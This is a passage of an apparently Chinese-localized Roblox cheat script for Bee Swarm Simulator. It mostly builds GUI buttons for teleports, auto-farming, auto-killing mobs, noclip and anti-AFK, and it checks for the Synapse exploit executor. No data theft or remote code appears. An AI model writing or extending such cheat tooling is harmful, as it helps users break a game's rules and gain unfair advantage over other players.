Demonmasktp.TextColor3 = Color3.new(1, 1, 1)
Demonmasktp.TextSize = 14
 
TunelBeartp.Name = "传送到隧道熊领域"
TunelBeartp.Parent = WaypointPage
TunelBeartp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
TunelBeartp.BorderSizePixel = 0
TunelBeartp.Position = UDim2.new(0.0140000004, 0, 0.340000004, 0)
TunelBeartp.Size = UDim2.new(0, 120, 0, 20)
TunelBeartp.Font = Enum.Font.GothamBold
TunelBeartp.Text = "传送到隧道熊"
TunelBeartp.TextColor3 = Color3.new(1, 1, 1)
TunelBeartp.TextSize = 14
 
WindyBeetp.Name = "传送到风神社"
WindyBeetp.Parent = WaypointPage
WindyBeetp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WindyBeetp.BorderSizePixel = 0
WindyBeetp.Position = UDim2.new(0.263000011, 0, 0.340000004, 0)
WindyBeetp.Size = UDim2.new(0, 120, 0, 20)
WindyBeetp.Font = Enum.Font.GothamBold
WindyBeetp.Text = "传送到风神社"
WindyBeetp.TextColor3 = Color3.new(1, 1, 1)
WindyBeetp.TextSize = 14
 
Diamondmasktp.Name = "传送到钻石面罩商店"
Diamondmasktp.Parent = WaypointPage
Diamondmasktp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Diamondmasktp.BorderSizePixel = 0
Diamondmasktp.Position = UDim2.new(0.513999999, 0, 0.340000004, 0)
Diamondmasktp.Size = UDim2.new(0, 120, 0, 20)
Diamondmasktp.Font = Enum.Font.GothamBold
Diamondmasktp.Text = "传送到钻石面罩商店"
Diamondmasktp.TextColor3 = Color3.new(1, 1, 1)
Diamondmasktp.TextSize = 14
 
Soon.Name = "很快"
Soon.Parent = WaypointPage
Soon.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Soon.BorderSizePixel = 0
Soon.Position = UDim2.new(0.755999982, 0, 0.379999995, 0)
Soon.Size = UDim2.new(0, 120, 0, 20)
Soon.Font = Enum.Font.GothamBold
Soon.Text = "很快"
Soon.TextColor3 = Color3.new(1, 1, 1)
Soon.TextSize = 14
 
GummyMask.Name = "传送到软糖面具商店"
GummyMask.Parent = WaypointPage
GummyMask.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
GummyMask.BorderSizePixel = 0
GummyMask.Position = UDim2.new(0.755999982, 0, 0.340000004, 0)
GummyMask.Size = UDim2.new(0, 120, 0, 20)
GummyMask.Font = Enum.Font.GothamBold
GummyMask.Text = "传送到软糖面具商店"
GummyMask.TextColor3 = Color3.new(1, 1, 1)
GummyMask.TextSize = 14
 
Afkstumptp.Name = "挂机树墩"
Afkstumptp.Parent = WaypointPage
Afkstumptp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Afkstumptp.BorderSizePixel = 0
Afkstumptp.Position = UDim2.new(0.513999999, 0, 0.379999995, 0)
Afkstumptp.Size = UDim2.new(0, 120, 0, 20)
Afkstumptp.Font = Enum.Font.GothamBold
Afkstumptp.Text = "挂机树墩"
Afkstumptp.TextColor3 = Color3.new(1, 1, 1)
Afkstumptp.TextSize = 14
 
Stinger.Name = "传送到毒针商店"
Stinger.Parent = WaypointPage
Stinger.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Stinger.BorderSizePixel = 0
Stinger.Position = UDim2.new(0.263000011, 0, 0.379999995, 0)
Stinger.Size = UDim2.new(0, 120, 0, 20)
Stinger.Font = Enum.Font.GothamBold
Stinger.Text = "传送到毒针商店"
Stinger.TextColor3 = Color3.new(1, 1, 1)
Stinger.TextSize = 14
 
Kingamulettp.Name = "传送到甲虫国王领域"
Kingamulettp.Parent = WaypointPage
Kingamulettp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Kingamulettp.BorderSizePixel = 0
Kingamulettp.Position = UDim2.new(0.754622638, 0, 0.300000012, 0)
Kingamulettp.Size = UDim2.new(0, 120, 0, 20)
Kingamulettp.Font = Enum.Font.GothamBold
Kingamulettp.Text = "传送到甲虫国王领域"
Kingamulettp.TextColor3 = Color3.new(1, 1, 1)
Kingamulettp.TextSize = 14
 
ExtraPage.Name = "附加页"
ExtraPage.Parent = MainPage
ExtraPage.BackgroundColor3 = Color3.new(1, 1, 1)
ExtraPage.BackgroundTransparency = 1
ExtraPage.Position = UDim2.new(0, 0, 0.127000034, 0)
ExtraPage.Size = UDim2.new(0, 530, 0, 174)
ExtraPage.Visible = false
ExtraPage.CanvasSize = UDim2.new(0, 0, 3, 0)
ExtraPage.ScrollBarThickness = 5
 
Autodig.Name = "自动挖掘"
Autodig.Parent = ExtraPage
Autodig.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autodig.BorderSizePixel = 0
Autodig.Position = UDim2.new(0.0160000008, 0, 0.0199999996, 0)
Autodig.Size = UDim2.new(0, 120, 0, 20)
Autodig.Font = Enum.Font.GothamBold
Autodig.Text = "自动挖掘"
Autodig.TextColor3 = Color3.new(1, 1, 1)
Autodig.TextSize = 14
 
Autobuffitem.Name = "自动项目buff"
Autobuffitem.Parent = ExtraPage
Autobuffitem.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autobuffitem.BorderSizePixel = 0
Autobuffitem.Position = UDim2.new(0.261000007, 0, 0.0199999996, 0)
Autobuffitem.Size = UDim2.new(0, 120, 0, 20)
Autobuffitem.Font = Enum.Font.GothamBold
Autobuffitem.Text = "自动项目buff"
Autobuffitem.TextColor3 = Color3.new(1, 1, 1)
Autobuffitem.TextSize = 14
 
Killcoconutcrab.Name = "自动杀死椰子蟹"
Killcoconutcrab.Parent = ExtraPage
Killcoconutcrab.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Killcoconutcrab.BorderSizePixel = 0
Killcoconutcrab.Position = UDim2.new(0.510999978, 0, 0.0199999996, 0)
Killcoconutcrab.Size = UDim2.new(0, 120, 0, 20)
Killcoconutcrab.Font = Enum.Font.GothamBold
Killcoconutcrab.Text = "自动杀死椰子蟹"
Killcoconutcrab.TextColor3 = Color3.new(1, 1, 1)
Killcoconutcrab.TextScaled = true
Killcoconutcrab.TextSize = 14
Killcoconutcrab.TextWrapped = true
 
KillTunnel.Name = "自动杀死隧道熊"
KillTunnel.Parent = ExtraPage
KillTunnel.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
KillTunnel.BorderSizePixel = 0
KillTunnel.Position = UDim2.new(0.755999982, 0, 0.0199999996, 0)
KillTunnel.Size = UDim2.new(0, 120, 0, 20)
KillTunnel.Font = Enum.Font.GothamBold
KillTunnel.Text = "自动杀死隧道熊"
KillTunnel.TextColor3 = Color3.new(1, 1, 1)
KillTunnel.TextSize = 14
 
Usenightbell.Name = "使用夜铃"
Usenightbell.Parent = ExtraPage
Usenightbell.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Usenightbell.BorderSizePixel = 0
Usenightbell.Position = UDim2.new(0.0160000008, 0, 0.0599999987, 0)
Usenightbell.Size = UDim2.new(0, 120, 0, 20)
Usenightbell.Font = Enum.Font.GothamBold
Usenightbell.Text = "使用夜铃"
Usenightbell.TextColor3 = Color3.new(1, 1, 1)
Usenightbell.TextSize = 14
 
Usefielddice.Name = "使用摇骰子"
Usefielddice.Parent = ExtraPage
Usefielddice.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Usefielddice.BorderSizePixel = 0
Usefielddice.Position = UDim2.new(0.261000007, 0, 0.0599999987, 0)
Usefielddice.Size = UDim2.new(0, 120, 0, 20)
Usefielddice.Font = Enum.Font.GothamBold
Usefielddice.Text = "使用摇骰子"
Usefielddice.TextColor3 = Color3.new(1, 1, 1)
Usefielddice.TextSize = 14
 
Autokillvicious.Name = "自动杀死恶魔"
Autokillvicious.Parent = ExtraPage
Autokillvicious.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autokillvicious.BorderSizePixel = 0
Autokillvicious.Position = UDim2.new(0.510999978, 0, 0.0599999987, 0)
Autokillvicious.Size = UDim2.new(0, 120, 0, 20)
Autokillvicious.Font = Enum.Font.GothamBold
Autokillvicious.Text = "自动杀死恶魔"
Autokillvicious.TextColor3 = Color3.new(1, 1, 1)
Autokillvicious.TextSize = 14
 
Autokillwindy.Name = "自动杀死风蜂"
Autokillwindy.Parent = ExtraPage
Autokillwindy.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autokillwindy.BorderSizePixel = 0
Autokillwindy.Position = UDim2.new(0.755999982, 0, 0.0599999987, 0)
Autokillwindy.Size = UDim2.new(0, 120, 0, 20)
Autokillwindy.Font = Enum.Font.GothamBold
Autokillwindy.Text = "自动杀死风蜂 "
Autokillwindy.TextColor3 = Color3.new(1, 1, 1)
Autokillwindy.TextSize = 14
 
Autokillmonster.Name = "自动杀死怪物"
Autokillmonster.Parent = ExtraPage
Autokillmonster.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autokillmonster.BorderSizePixel = 0
Autokillmonster.Position = UDim2.new(0.755999982, 0, 0.100000001, 0)
Autokillmonster.Size = UDim2.new(0, 120, 0, 20)
Autokillmonster.Font = Enum.Font.GothamBold
Autokillmonster.Text = "自动夜铃"
Autokillmonster.TextColor3 = Color3.new(1, 1, 1)
Autokillmonster.TextSize = 14
 
RemoteQuest.Name = "远程任务"
RemoteQuest.Parent = ExtraPage
RemoteQuest.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
RemoteQuest.BorderSizePixel = 0
RemoteQuest.Position = UDim2.new(0.510999978, 0, 0.100000001, 0)
RemoteQuest.Size = UDim2.new(0, 120, 0, 20)
RemoteQuest.Font = Enum.Font.GothamBold
RemoteQuest.Text = "自动任务"
RemoteQuest.TextColor3 = Color3.new(1, 1, 1)
RemoteQuest.TextSize = 14
 
Autogumdrop.Name = "自动滴胶"
Autogumdrop.Parent = ExtraPage
Autogumdrop.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autogumdrop.BorderSizePixel = 0
Autogumdrop.Position = UDim2.new(0.261000007, 0, 0.100000001, 0)
Autogumdrop.Size = UDim2.new(0, 120, 0, 20)
Autogumdrop.Font = Enum.Font.GothamBold
Autogumdrop.Text = "自动滴胶"
Autogumdrop.TextColor3 = Color3.new(1, 1, 1)
Autogumdrop.TextSize = 14
 
FindWindBee.Name = "找风蜂"
FindWindBee.Parent = ExtraPage
FindWindBee.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FindWindBee.BorderSizePixel = 0
FindWindBee.Position = UDim2.new(0.0160000008, 0, 0.100000001, 0)
FindWindBee.Size = UDim2.new(0, 120, 0, 20)
FindWindBee.Font = Enum.Font.GothamBold
FindWindBee.Text = "找风蜂"
FindWindBee.TextColor3 = Color3.new(1, 1, 1)
FindWindBee.TextSize = 14
 
Useglitter.Name = "Useglitter"
Useglitter.Parent = ExtraPage
Useglitter.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Useglitter.BorderSizePixel = 0
Useglitter.Position = UDim2.new(0.755999982, 0, 0.140375406, 0)
Useglitter.Size = UDim2.new(0, 120, 0, 20)
Useglitter.Font = Enum.Font.GothamBold
Useglitter.Text = "自动收集火花"
Useglitter.TextColor3 = Color3.new(1, 1, 1)
Useglitter.TextSize = 14
 
Autogliter.Name = "自动火光"
Autogliter.Parent = ExtraPage
Autogliter.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autogliter.BorderSizePixel = 0
Autogliter.Position = UDim2.new(0.510999978, 0, 0.140375406, 0)
Autogliter.Size = UDim2.new(0, 120, 0, 20)
Autogliter.Font = Enum.Font.GothamBold
Autogliter.Text = "自动火光"
Autogliter.TextColor3 = Color3.new(1, 1, 1)
Autogliter.TextSize = 14
 
Autococonut.Name = "自动椰子"
Autococonut.Parent = ExtraPage
Autococonut.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autococonut.BorderSizePixel = 0
Autococonut.Position = UDim2.new(0.0160000008, 0, 0.140375406, 0)
Autococonut.Size = UDim2.new(0, 120, 0, 20)
Autococonut.Font = Enum.Font.GothamBold
Autococonut.Text = "自动椰子"
Autococonut.TextColor3 = Color3.new(1, 1, 1)
Autococonut.TextSize = 14
 
Autostinger.Name = "自动毒针"
Autostinger.Parent = ExtraPage
Autostinger.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autostinger.BorderSizePixel = 0
Autostinger.Position = UDim2.new(0.261000007, 0, 0.140375406, 0)
Autostinger.Size = UDim2.new(0, 120, 0, 20)
Autostinger.Font = Enum.Font.GothamBold
Autostinger.Text = "自动毒针"
Autostinger.TextColor3 = Color3.new(1, 1, 1)
Autostinger.TextSize = 14
 
Eqipdemonmask.Name = "装备恶魔面具"
Eqipdemonmask.Parent = ExtraPage
Eqipdemonmask.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Eqipdemonmask.BorderSizePixel = 0
Eqipdemonmask.Position = UDim2.new(0.755999982, 0, 0.180000007, 0)
Eqipdemonmask.Size = UDim2.new(0, 120, 0, 20)
Eqipdemonmask.Font = Enum.Font.GothamBold
Eqipdemonmask.Text = "装备恶魔面具"
Eqipdemonmask.TextColor3 = Color3.new(1, 1, 1)
Eqipdemonmask.TextScaled = true
Eqipdemonmask.TextSize = 14
Eqipdemonmask.TextWrapped = true
 
Equipdemonmask.Name = "装备钻石面具"
Equipdemonmask.Parent = ExtraPage
Equipdemonmask.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Equipdemonmask.BorderSizePixel = 0
Equipdemonmask.Position = UDim2.new(0.510999978, 0, 0.180000007, 0)
Equipdemonmask.Size = UDim2.new(0, 120, 0, 20)
Equipdemonmask.Font = Enum.Font.GothamBold
Equipdemonmask.Text = "装备钻石面具"
Equipdemonmask.TextColor3 = Color3.new(1, 1, 1)
Equipdemonmask.TextScaled = true
Equipdemonmask.TextSize = 14
Equipdemonmask.TextWrapped = true
 
Equipgummymask.Name = "装备软糖面具"
Equipgummymask.Parent = ExtraPage
Equipgummymask.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Equipgummymask.BorderSizePixel = 0
Equipgummymask.Position = UDim2.new(0.261000007, 0, 0.180000007, 0)
Equipgummymask.Size = UDim2.new(0, 120, 0, 20)
Equipgummymask.Font = Enum.Font.GothamBold
Equipgummymask.Text = "装备软糖面具"
Equipgummymask.TextColor3 = Color3.new(1, 1, 1)
Equipgummymask.TextScaled = true
Equipgummymask.TextSize = 14
Equipgummymask.TextWrapped = true
 
Automagicbean.Name = "自动魔豆"
Automagicbean.Parent = ExtraPage
Automagicbean.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Automagicbean.BorderSizePixel = 0
Automagicbean.Position = UDim2.new(0.0160000008, 0, 0.180000007, 0)
Automagicbean.Size = UDim2.new(0, 120, 0, 20)
Automagicbean.Font = Enum.Font.GothamBold
Automagicbean.Text = "自动魔豆"
Automagicbean.TextColor3 = Color3.new(1, 1, 1)
Automagicbean.TextSize = 14
 
Bringtornado.Name = "带来龙卷风"
Bringtornado.Parent = ExtraPage
Bringtornado.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Bringtornado.BorderSizePixel = 0
Bringtornado.Position = UDim2.new(0.755999982, 0, 0.219999999, 0)
Bringtornado.Size = UDim2.new(0, 120, 0, 20)
Bringtornado.Font = Enum.Font.GothamBold
Bringtornado.Text = "带来龙卷风"
Bringtornado.TextColor3 = Color3.new(1, 1, 1)
Bringtornado.TextSize = 14
 
Killstumnail.Name = "自动收集叶子"
Killstumnail.Parent = ExtraPage
Killstumnail.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Killstumnail.BorderSizePixel = 0
Killstumnail.Position = UDim2.new(0.510999978, 0, 0.219999999, 0)
Killstumnail.Size = UDim2.new(0, 120, 0, 20)
Killstumnail.Font = Enum.Font.GothamBold
Killstumnail.Text = "自动收集叶子"
Killstumnail.TextColor3 = Color3.new(1, 1, 1)
Killstumnail.TextSize = 14
 
Dropweapon.Name = "放下武器"
Dropweapon.Parent = ExtraPage
Dropweapon.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Dropweapon.BorderSizePixel = 0
Dropweapon.Position = UDim2.new(0.261000007, 0, 0.219999999, 0)
Dropweapon.Size = UDim2.new(0, 120, 0, 20)
Dropweapon.Font = Enum.Font.GothamBold
Dropweapon.Text = "放下武器"
Dropweapon.TextColor3 = Color3.new(1, 1, 1)
Dropweapon.TextSize = 14
 
Noclip.Name = "穿墙模式"
Noclip.Parent = ExtraPage
Noclip.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0.0160000008, 0, 0.219999999, 0)
Noclip.Size = UDim2.new(0, 120, 0, 20)
Noclip.Font = Enum.Font.GothamBold
Noclip.Text = "穿墙模式"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 14
 
AutoDispenser.Name = "自动分配器"
AutoDispenser.Parent = ExtraPage
AutoDispenser.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
AutoDispenser.BorderSizePixel = 0
AutoDispenser.Position = UDim2.new(0.0144905448, 0, 0.261870772, 0)
AutoDispenser.Size = UDim2.new(0, 120, 0, 20)
AutoDispenser.Font = Enum.Font.GothamBold
AutoDispenser.Text = "自动分配器"
AutoDispenser.TextColor3 = Color3.new(1, 1, 1)
AutoDispenser.TextSize = 14
 
Autotop.Name = "自动顶部"
Autotop.Parent = ExtraPage
Autotop.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autotop.BorderSizePixel = 0
Autotop.Position = UDim2.new(0.259773552, 0, 0.261870772, 0)
Autotop.Size = UDim2.new(0, 120, 0, 20)
Autotop.Font = Enum.Font.GothamBold
Autotop.Text = "自动分配器"
Autotop.TextColor3 = Color3.new(1, 1, 1)
Autotop.TextSize = 14
 
AutoDispenser_2.Name = "自动分配器"
AutoDispenser_2.Parent = ExtraPage
AutoDispenser_2.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
AutoDispenser_2.BorderSizePixel = 0
AutoDispenser_2.Position = UDim2.new(0.259773552, 0, 0.261870772, 0)
AutoDispenser_2.Size = UDim2.new(0, 120, 0, 20)
AutoDispenser_2.Font = Enum.Font.GothamBold
AutoDispenser_2.Text = "自动顶部增压器"
AutoDispenser_2.TextColor3 = Color3.new(1, 1, 1)
AutoDispenser_2.TextSize = 14
 
Autored.Name = "自动编辑"
Autored.Parent = ExtraPage
Autored.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autored.BorderSizePixel = 0
Autored.Position = UDim2.new(0.510716915, 0, 0.261870772, 0)
Autored.Size = UDim2.new(0, 120, 0, 20)
Autored.Font = Enum.Font.GothamBold
Autored.Text = "自动编辑增压器"
Autored.TextColor3 = Color3.new(1, 1, 1)
Autored.TextScaled = true
Autored.TextSize = 14
Autored.TextWrapped = true
 
Autoblue.Name = "自动错误"
Autoblue.Parent = ExtraPage
Autoblue.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Autoblue.BorderSizePixel = 0
Autoblue.Position = UDim2.new(0.755999923, 0, 0.261870772, 0)
Autoblue.Size = UDim2.new(0, 120, 0, 20)
Autoblue.Font = Enum.Font.GothamBold
Autoblue.Text = "自动错误增压器"
Autoblue.TextColor3 = Color3.new(1, 1, 1)
Autoblue.TextScaled = true
Autoblue.TextSize = 14
Autoblue.TextWrapped = true
 
ExtrasButton.Name = "附加按钮"
ExtrasButton.Parent = MainPage
ExtrasButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
ExtrasButton.BorderSizePixel = 0
ExtrasButton.Position = UDim2.new(0.538195491, 0, 0.0399999991, 0)
ExtrasButton.Size = UDim2.new(0.159999996, 0, 0.0869999975, 0)
ExtrasButton.Font = Enum.Font.GothamBold
ExtrasButton.Text = "额外费用"
ExtrasButton.TextColor3 = Color3.new(1, 1, 1)
ExtrasButton.TextSize = 14
 
FarmingButton.Name = "收集按钮"
FarmingButton.Parent = MainPage
FarmingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FarmingButton.BorderSizePixel = 0
FarmingButton.Position = UDim2.new(0.198195487, 0, 0.0399999991, 0)
FarmingButton.Size = UDim2.new(0.159999996, 0, 0.0869999975, 0)
FarmingButton.Font = Enum.Font.GothamBold
FarmingButton.Text = "收集"
FarmingButton.TextColor3 = Color3.new(1, 1, 1)
FarmingButton.TextSize = 14
 
HomeButton.Name = "主页按钮"
HomeButton.Parent = MainPage
HomeButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
HomeButton.BorderSizePixel = 0
HomeButton.Position = UDim2.new(0.0281954892, 0, 0.0399999991, 0)
HomeButton.Size = UDim2.new(0.159999996, 0, 0.0869999975, 0)
HomeButton.Font = Enum.Font.GothamBold
HomeButton.Text = "主页"
HomeButton.TextColor3 = Color3.new(1, 1, 1)
HomeButton.TextSize = 14
 
SettingButton.Name = "设置按钮"
SettingButton.Parent = MainPage
SettingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SettingButton.BorderSizePixel = 0
SettingButton.Position = UDim2.new(0.708195508, 0, 0.0399999991, 0)
SettingButton.Size = UDim2.new(0.159999996, 0, 0.0869999975, 0)
SettingButton.Font = Enum.Font.GothamBold
SettingButton.Text = "设置"
SettingButton.TextColor3 = Color3.new(1, 1, 1)
SettingButton.TextSize = 14
 
WaypointsButton.Name = "航路点按钮"
WaypointsButton.Parent = MainPage
WaypointsButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WaypointsButton.BorderSizePixel = 0
WaypointsButton.Position = UDim2.new(0.368195474, 0, 0.0399999991, 0)
WaypointsButton.Size = UDim2.new(0.159999996, 0, 0.0869999975, 0)
WaypointsButton.Font = Enum.Font.GothamBold
WaypointsButton.Text = "航路点"
WaypointsButton.TextColor3 = Color3.new(1, 1, 1)
WaypointsButton.TextSize = 14
 
SettingPage.Name = "设置按钮"
SettingPage.Parent = MainPage
SettingPage.BackgroundColor3 = Color3.new(1, 1, 1)
SettingPage.BackgroundTransparency = 1
SettingPage.Position = UDim2.new(-0, 0, 0.127000004, 0)
SettingPage.Size = UDim2.new(1, 0, 0.787999988, 0)
SettingPage.Visible = false
 
Antiafk.Name = "反对挂机"
Antiafk.Parent = SettingPage
Antiafk.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Antiafk.BorderSizePixel = 0
Antiafk.Position = UDim2.new(0.0264150947, 0, 0.0853963569, 0)
Antiafk.Size = UDim2.new(0, 98, 0, 20)
Antiafk.Font = Enum.Font.GothamBold
Antiafk.Text = "反对挂机"
Antiafk.TextColor3 = Color3.new(1, 1, 1)
Antiafk.TextSize = 14
 
Antiafkbutton.Name = "反AFK按钮"
Antiafkbutton.Parent = Antiafk
Antiafkbutton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Antiafkbutton.BorderSizePixel = 0
Antiafkbutton.Position = UDim2.new(1.08163261, 0, 0, 0)
Antiafkbutton.Size = UDim2.new(0, 20, 0, 20)
Antiafkbutton.Font = Enum.Font.GothamBold
Antiafkbutton.Text = "X"
Antiafkbutton.TextColor3 = Color3.new(1, 1, 1)
Antiafkbutton.TextScaled = true
Antiafkbutton.TextSize = 14
Antiafkbutton.TextWrapped = true
 
Close.Name = "关掉"
Close.Parent = MiniPage
Close.BackgroundColor3 = Color3.new(1, 1, 1)
Close.BackgroundTransparency = 1
Close.Position = UDim2.new(0.00760612637, 0, 0.0016666688, 0)
Close.Size = UDim2.new(0, 25, 0, 25)
Close.Font = Enum.Font.GothamBold
Close.Text = "-"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextSize = 20
 
DarkCyberLoadingGUI.Name = "[DarkCyber]加载GUI"
DarkCyberLoadingGUI.Parent = game.CoreGui
 
LoadingFrame.Name = "加载框架"
LoadingFrame.Parent = DarkCyberLoadingGUI
LoadingFrame.BackgroundColor3 = Color3.new(0.321569, 0.462745, 1)
LoadingFrame.BorderSizePixel = 0
LoadingFrame.Position = UDim2.new(0.410933673, 0, 0.416230351, 0)
LoadingFrame.Size = UDim2.new(0, 342, 0, 127)
 
Createtitle.Name = "创建标题"
Createtitle.Parent = LoadingFrame
Createtitle.BackgroundColor3 = Color3.new(1, 1, 1)
Createtitle.BackgroundTransparency = 1
Createtitle.Size = UDim2.new(0, 108, 0, 25)
Createtitle.Font = Enum.Font.GothamBlack
Createtitle.Text = "繁星"
Createtitle.TextColor3 = Color3.new(1, 1, 1)
Createtitle.TextSize = 14
 
NameTitle.Name = "名字标题"
NameTitle.Parent = Createtitle
NameTitle.BackgroundColor3 = Color3.new(1, 1, 1)
NameTitle.BackgroundTransparency = 1
NameTitle.Position = UDim2.new(1, 0, 0, 0)
NameTitle.Size = UDim2.new(0, 233, 0, 25)
NameTitle.Font = Enum.Font.GothamBold
NameTitle.Text = "蜂群模拟器"
NameTitle.TextColor3 = Color3.new(1, 1, 1)
NameTitle.TextSize = 14
 
Loadingimage.Name = "正在加载图像"
Loadingimage.Parent = LoadingFrame
Loadingimage.BackgroundColor3 = Color3.new(1, 1, 1)
Loadingimage.BackgroundTransparency = 1
Loadingimage.BorderSizePixel = 0
Loadingimage.Position = UDim2.new(0.112938613, 0, 0.29838711, 0)
Loadingimage.Size = UDim2.new(0, 50, 0, 50)
Loadingimage.Image = "http://www.roblox.com/asset/?id=3953349579"
 
Loadingtext.Name = "正在加载文本"
Loadingtext.Parent = LoadingFrame
Loadingtext.BackgroundColor3 = Color3.new(1, 1, 1)
Loadingtext.BackgroundTransparency = 1
Loadingtext.Position = UDim2.new(0.3004677, 0, 0.307086617, 0)
Loadingtext.Size = UDim2.new(0, 200, 0, 50)
Loadingtext.Font = Enum.Font.GothamBold
Loadingtext.Text = "正在加载地点"
Loadingtext.TextColor3 = Color3.new(0, 0, 0)
Loadingtext.TextSize = 17
Loadingtext.TextXAlignment = Enum.TextXAlignment.Left
 
DarkCyberSynapshitGUI.Name = "[DarkCyber]CUA汉化GUI"
DarkCyberSynapshitGUI.Parent = game.CoreGui
 
SynapShitPage.Name = "突触屎页"
SynapShitPage.Parent = DarkCyberSynapshitGUI
SynapShitPage.BackgroundColor3 = Color3.new(0.321569, 0.462745, 1)
SynapShitPage.BorderSizePixel = 0
SynapShitPage.Position = UDim2.new(0.416354954, 0, 0.417690426, 0)
SynapShitPage.Size = UDim2.new(0, 267, 0, 134)
SynapShitPage.Visible = false
 
local Createtitle2 = Instance.new("TextLabel")
 
Createtitle2.Name = "创建标题"
Createtitle2.Parent = SynapShitPage
Createtitle2.BackgroundColor3 = Color3.new(1, 1, 1)
Createtitle2.BackgroundTransparency = 1
Createtitle2.Size = UDim2.new(0, 108, 0, 25)
Createtitle2.Font = Enum.Font.GothamBlack
Createtitle2.Text = "cua汉化脚本"
Createtitle2.TextColor3 = Color3.new(1, 1, 1)
Createtitle2.TextSize = 14
 
NameTitle2 = Instance.new("TextLabel")
 
NameTitle2.Name = "名字标题"
NameTitle2.Parent = Createtitle2
NameTitle2.BackgroundColor3 = Color3.new(1, 1, 1)
NameTitle2.BackgroundTransparency = 1
NameTitle2.Position = UDim2.new(0.997087002, 0, 0, 0)
NameTitle2.Size = UDim2.new(0, 159, 0, 25)
NameTitle2.Font = Enum.Font.GothamBold
NameTitle2.Text = "蜂群模拟器"
NameTitle2.TextColor3 = Color3.new(1, 1, 1)
NameTitle2.TextSize = 14
 
Welcome.Name = "欢迎"
Welcome.Parent = SynapShitPage
Welcome.BackgroundColor3 = Color3.new(1, 1, 1)
Welcome.BackgroundTransparency = 1
Welcome.Position = UDim2.new(0, 0, 0.313432842, 0)
Welcome.Size = UDim2.new(0, 266, 0, 50)
Welcome.Font = Enum.Font.GothamBold
Welcome.Text = "欢迎使用CUA汉化的脚本"
Welcome.TextColor3 = Color3.new(1, 1, 1)
Welcome.TextSize = 25
Welcome.TextWrapped = true
 
-- Scripts:
local red = Color3.fromRGB(255, 80, 80)
local blue = Color3.new(0.34902, 0.32549, 1)
 
MiniPage.Selectable = true
MiniPage.Draggable = true
MiniPage.Active = true
 
local repss = 0
local xoay = 0
 
spawn(function()
for i=1,150 do wait(.05)
      xoay = xoay - 10
      Loadingimage.Rotation = xoay
end
end)
 
for c=1,10 do wait(.3)
      Loadingtext.Text = "Loading Place"..string.rep('.',repss%3+1)
      repss = repss + 1
end
 
Loadingtext.Text = "Loading Place: Success"
wait(1)
 
local repss = 0
 
for d=1,10 do wait(.3)
      Loadingtext.Text = "Loading UI"..string.rep('.',repss%3+1)
      repss = repss + 1
end
 
if game.PlaceId == 1537690962 or game.PlaceId == 4079902982 then
Loadingtext.Text = "Loading UI: Success"
if syn then
LoadingFrame:TweenPosition(UDim2.new(0.410933673, 0, -0.7, 0))
wait(1)
DarkCyberLoadingGUI:Destroy()
SynapShitPage.Visible = true
wait(2)
SynapShitPage:TweenPosition(UDim2.new(0.416354954, 0, -0.717690426, 0))
wait(1)
DarkCyberSynapshitGUI:Destroy()
wait(1)
MiniPage:TweenPosition(UDim2.new(0.361979187, 0, 0.34183538, 0))  --0.361979187, 0, 0.34183538, 0
else
LoadingFrame:TweenPosition(UDim2.new(0.410933673, 0, -0.7, 0))
wait(1)
DarkCyberLoadingGUI:Destroy()
MiniPage:TweenPosition(UDim2.new(0.361979187, 0, 0.34183538, 0))  --0.361979187, 0, 0.34183538, 0
end
end
 
Copylinkdiscord.MouseButton1Down:Connect(function()
setclipboard("discord.gg/GT6uXF2")
end)
 
HomeButton.MouseButton1Down:Connect(function()
HomeButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
FarmingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WaypointsButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
